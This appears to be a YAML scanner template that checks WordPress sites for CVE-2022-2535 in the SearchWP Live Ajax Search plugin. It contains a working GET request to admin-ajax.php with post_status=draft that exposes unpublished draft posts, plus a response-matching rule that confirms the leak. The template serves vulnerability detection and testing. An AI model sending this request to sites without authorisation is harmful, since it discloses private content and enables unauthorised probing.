name: yaml-poc-searchwp-searchwp_live_ajax_search-other-CVE-2022-2535
binding: c703090e-e40c-4452-a84a-c4656af64053
detail:
    author: jiapeng.han
    links:
        - https://cxsecurity.com/cveshow/CVE-2022-2535/
        - https://wpscan.com/vulnerability/0e13c375-044c-4c2e-ab8e-48cb89d90d02
    vulnerability:
        id: 1e33a5b9-71f1-4376-89c5-940084b0d698
        level: medium
    warning: Harmless
transport: http
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /wp-admin/admin-ajax.php?action=searchwp_live_search&swpquery=a&post_status=draft
        expression: response.status == 200 && response.body.bcontains(b"<div class=\"searchwp-live-search-result\"") && response.body.bcontains(b"<div class=\"searchwp-live-search-result\"") && '<a href="http|https://(.*?)">'.bmatches(response.body)
expression: r0()
